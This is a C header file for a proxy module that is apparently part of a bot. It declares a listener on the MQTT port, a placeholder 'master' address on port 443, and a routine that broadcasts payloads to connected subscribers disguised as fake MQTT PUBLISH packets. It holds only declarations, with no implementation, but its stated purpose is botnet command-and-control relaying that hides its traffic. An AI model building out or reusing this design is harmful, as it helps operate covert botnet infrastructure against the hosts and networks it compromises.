#ifndef PROXY_H
#define PROXY_H

#include <stdbool.h>
#include <stdint.h>
#include <netinet/in.h>

// Config
#define PROXY_LISTEN_PORT 1883 // MQTT
#define MASTER_IP "1.2.3.4"   // Placeholder
#define MASTER_PORT 443
#define MAX_SUBSCRIBERS 5

typedef struct {
    int fd;
    bool active;
    time_t last_heartbeat;
} Subscriber;

/**
 * Initializes the Proxy Listener (TCP).
 * @return socket fd on success, -1 on failure
 */
int proxy_init(void);

/**
 * Handle incoming connection (non-blocking accept & process).
 * In a real bot, called from main loop when select() indicates readability.
 * @param listener_sock The server socket
 */
void proxy_handle_new_conn(int listener_sock);

/**
 * Broadcasts a payload to all active subscribers via Fake MQTT PUBLISH.
 * Encapsulates the payload in a valid V3 packet.
 */
void proxy_broadcast(const uint8_t *payload, size_t len);

/**
 * Maintenance loop for subscribers (Prune dead connections).
 */
void proxy_poll(void);

#endif // PROXY_H
